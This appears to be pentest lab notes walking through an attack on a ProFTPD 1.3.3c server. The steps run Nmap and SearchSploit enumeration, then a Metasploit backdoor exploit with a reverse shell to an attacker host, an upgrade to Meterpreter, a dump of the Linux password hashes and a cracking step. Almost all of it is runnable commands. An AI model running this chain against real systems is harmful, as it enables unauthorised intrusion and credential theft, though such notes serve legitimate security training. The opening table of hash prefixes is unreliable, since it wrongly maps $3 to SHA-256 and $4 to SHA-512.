### Linux Password Hashes

| Value | Hashing Algorithms |
| ----- | ------------------ |
| $1    | MD5                |
| $2    | Blowfish           |
| $3    | SHA-256            |
| $4    | SHA-512            |

***

### Enumeration
##### Nmap
```
nmap -sV IP
```

```
nmap --script vuln -p21 IP
```

##### SearchSploit
```
searchsploit proftpd 1.3.3c
```

### Exploitation
##### Msfconsole
```
use exploit/unix/ftp/proftpd_133c_backdoor
set payload payload/cmd/unix/reverse
set rhosts IP
set lhost IP
exploit -z
```

**Upgrade the Session to Meterpreter**
It uses `shell_to_meterpreter` module to upgrade the session.
```
sessions
sessions -u 1
```

### Post Exploitation Module
`Hashdump` cannot be used even though we have a meterpreter session because the `load priv` extension is not supported by this meterpreter type (x86/linux).
```
use post/linux/gather/hashdump
set session 2
run
```

### Crack the Hash
```
use auxiliary/analyze/crack_linux
set SHA512 true
run
```

